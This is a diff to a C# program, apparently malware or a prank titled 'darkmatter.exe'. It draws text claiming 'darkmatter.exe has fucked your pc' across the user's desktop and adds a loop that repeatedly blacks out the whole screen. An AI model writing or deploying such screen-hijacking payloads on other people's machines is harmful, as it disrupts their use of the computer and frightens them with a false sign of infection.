@@ -871,7 +871,7 @@ namespace gdi2
             waveOut2.Init(waveProvider2);
             waveOut2.Play();
             stopwatch.Restart();
-            
+            string[] text = { "darkmatter.exe", "darkmatter.exe has fucked your pc", "un3nown" };
             while (stopwatch.ElapsedMilliseconds < duration)
             {
                 r = new Random();
@@ -886,7 +886,6 @@ namespace gdi2
                 IntPtr oldFont = SelectObject(hdc, hFont);
                 for (int i = 0; i < 30; i++)
                 {
-                    string[] text = { "darkmatter.exe", "darkmatter.exe has fucked your pc", "un3nown" };
                     int rndx = r.Next(x);
                     int rndy = r.Next(y);
                     SetTextColor(hdc, (int)rndclr[r.Next(rndclr.Length)]);
@@ -896,8 +895,30 @@ namespace gdi2
                 DeleteObject(hFont);
                 DeleteObject(brush);
                 DeleteDC(hdc);
+                Thread.Sleep(50);                
+            }
+            stopwatch.Restart();
+            string text2 = "darkmatter.exe";
+            while (stopwatch.ElapsedMilliseconds < duration)
+            {
+                r = new Random();
+                IntPtr hdc = GetDC(IntPtr.Zero);
+                IntPtr brush = CreateSolidBrush(0x000000);
+                int rndx = r.Next(x);
+                int rndy = r.Next(y);
+                var rect = new RECT(0, 0, x, y);
+                SelectObject(hdc, brush);
+                FillRect(hdc, ref rect, brush);
+                SetBkColor(hdc, 0x000000);
+                SetTextColor(hdc, 0xFFFFFF);
+                IntPtr hFont = CreateFont(-50, 0, 0, 0, 400, 0, 0, 0, 1, 0, 0, 0, 0, "Arial");
+                IntPtr oldFont = SelectObject(hdc, hFont);
+                TextOut(hdc, rndx, rndy, text2, text2.Length);
+                SelectObject(hdc, oldFont);
+                DeleteObject(hFont);
+                DeleteObject(brush);
+                DeleteDC(hdc);
                 Thread.Sleep(50);
-                
             }
 
         }
